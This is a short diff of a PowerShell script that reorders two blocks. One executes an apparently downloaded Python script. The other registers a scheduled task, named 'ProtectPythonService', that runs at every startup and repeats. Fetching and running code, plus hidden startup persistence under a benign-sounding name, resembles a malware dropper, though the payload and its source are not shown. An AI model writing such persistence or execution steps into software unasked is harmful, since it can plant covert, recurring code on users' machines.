@@ -81,21 +81,6 @@ try {
     }
 }
 
-# Call the downloaded script if exist
-if (Test-Path -Path $scriptPath) {
-	$scriptPathNoExtension = [System.IO.Path]::GetFileNameWithoutExtension($scriptPath)
-
-    # Start the Python script in the background
-	#Start-Process -FilePath $pythonPath -ArgumentList $scriptPath -NoNewWindow 
-# Execute the script
-	& "$pythonPath" "$scriptPath"
-	echo "[*] Python Script executed!"
-    #Write-Output "[*] Python script started in the background."
-} else {
-    Write-Output "[!] The script at $scriptPath does not exist. Cannot execute."
-}
-
-
 # Schedule Task for every startup
 $TaskName = "ProtectPythonService"
 
@@ -124,3 +109,18 @@ $t1.Repetition = $t2.Repetition
 
 # Register the task
 Register-ScheduledTask -Action $action -Trigger $t1 -TaskName $TaskName -Force
+
+
+# Call the downloaded script if exist
+if (Test-Path -Path $scriptPath) {
+	$scriptPathNoExtension = [System.IO.Path]::GetFileNameWithoutExtension($scriptPath)
+
+    # Start the Python script in the background
+	#Start-Process -FilePath $pythonPath -ArgumentList $scriptPath -NoNewWindow 
+# Execute the script
+	& "$pythonPath" "$scriptPath"
+	echo "[*] Python Script executed!"
+    #Write-Output "[*] Python script started in the background."
+} else {
+    Write-Output "[!] The script at $scriptPath does not exist. Cannot execute."
+}
